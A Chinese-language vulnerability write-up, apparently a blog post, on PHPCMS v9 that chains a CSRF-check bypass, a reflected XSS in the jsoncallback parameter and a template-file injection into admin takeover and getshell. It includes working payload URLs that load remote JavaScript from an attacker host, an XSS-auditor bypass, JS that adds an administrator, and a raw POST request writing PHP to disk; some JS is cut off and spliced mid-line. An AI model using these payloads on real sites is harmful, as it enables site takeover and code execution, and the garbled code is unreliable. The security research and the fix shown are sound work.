第24行调用check_hash函数来校验pc_hash的值以防止csrf漏洞
同样的在该函数中，如果`$_GET[‘a’]`参数为public_开头的则返回true，不再校验pc_hash
所以如果后台中有以public_开头的函数存在漏洞，则能绕过pc_hash的校验，造成csrf漏洞。
上面说到的后台反射型xss就是在 **public_**
开头的函数中，所以后台用户访问时不需要校验pc_hash，不过还是会校验后台权限，所以这个xss只能用来攻击后台用户。
### 0x05 化腐朽为神奇的后台反射型xss
> 在\phpcms\modules\admin\plugin.php文件public_appcenter_ajx_detail函数中
第409行获取远程内容
第411行`$_GET['jsoncallback']`连同获取的内容被一起输出到页面中
链接地址：
    /index.php?m=admin&c=plugin&a=public_appcenter_ajx_detail&jsoncallback=
3.js的内容为`’alert(1);’`，后台用户访问该链接即可加载远端js，然后js被执行，弹出1
修复建议：
修改\phpcms\modules\admin\plugin.php文件
第411行为
    echo htmlspecialchars($_GET['jsoncallback'].'('.$data.')');
修改后对比图：
修改后js已经不能被加载和执行
（注：()内本来不会有内容的，因为请求域名不存在，本地网络被运营商劫持，强行加上去的）
**利用：**
将以下1,2,3方法联合起来使用，就可以实现点击一个链接造成添加管理员或者直接getshell的效果
(1)添加管理员
有了xss，有了pc_hash，那就能通过csrf漏洞在后台为所欲为了，比如添加一个管理员。在添加管理员中的请求中还有一个重要的参数，就是admin_manage_code
这个参数可以从以下连接获取。
> /index.php?m=admin&c=admin_manage&a=add&menuid=54&pc_hash=xxxxx
所以这里需要先获取到pc_hash，然后再获取admin_manage_code，最后就能构造添加管理员的请求包，管理员已登录的情况下，火狐打开如下链接：
    /index.php?m=admin&c=plugin&a=public_appcenter_ajx_detail&jsoncallback=%3Cscript%20src=http://192.168.99.129/2.js%3E%3C/script%3E
更新：绕过最新chrome浏览器的xss auditor：
    /index.php?m=admin&c=plugin&a=public_appcenter_ajx_detail&jsoncallback=%00%00%00%00%00%00%00%3Cscript%20src=http://192.168.99.129/2.js%3E%3C/script%3E
2.js的内容为如下：
    var request = false;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
        if (request.overrideMimeType) {
            request.overrideMimeType('text/xml')
        }
    } else if (window.ActiveXObject) {
        var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
        for (var i = 0; i %00%00%00%00%00%00%00%3Cscript%20src=http://192.168.99.129/1.js%3E%3C/script%3E
1.js的内容如下
    var request = false;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
        if (request.overrideMimeType) {
            request.overrideMimeType('text/xml')
        }
    } else if (window.ActiveXObject) {
        var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
        for (var i = 0; i  在\phpcms\modules\block\block_admin.php函数public_view中
第239行先判断数据库中是否有记录，没有记录的话即直接退出了。
综合第243、245行的判断需要满足表v9_block需要有数据，且选择的数据中type的值为2。
第252行获取要写入文件的内容
第258、259行对内容进行过滤,在函数new_stripslashes中
会对值进行stripslashes函数处理，把之前单引号过滤等还原回来
在函数template_parse中
该函数对写入文件的内容进行填充，第132行将
写入文件头部，以防止文件被web直接访问
第260行指定文件为\caches\caches _template\block\tmp_ $_GET['id'].php
第265行将内容写入到该文件中
如果文件写入成功，在267行包含该文件并读取内容，第270行删除该文件
综上，写入的文件内容可控，且因为new_stripslashes函数的处理导致我们可以引入单引号，也因为最后文件被包含后就会被删除，所以最后漏洞的利用方法为当文件被包含的时候就生成另外的文件。
漏洞的触发点在后台的
> 内容 > 内容发布管理 > 碎片管理 >
默认安装下v9_block表是空的，关于如何添加碎片：
一旦用户已经添加过碎片，即v9_block表中有数据且type类型为2时就可以触发该漏洞，否则就比较麻烦，还是要利用上面的反射型xss先添加一个记录，再进行漏洞的利用。
id（$_GET['id']）是可猜解的,发起如下请求：
    POST /index.php?m=block&c=block_admin&a=public_view&id=2 HTTP/1.1
    Host: 192.168.99.127
    Content-Length: 178
    Pragma: no-cache
    Cache-Control: no-cache
    Origin: http://192.168.99.127
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
    DNT: 1
    Referer: 
    Cookie:
    Connection: close
    title[x]=a&url[x]=b&thumb[x]=c&desc[x]=d&template=heiheihei');?>bbb
即可生成\caches\caches_template\block\1.php文件
从csrf到漏洞的利用脚本我就不写了。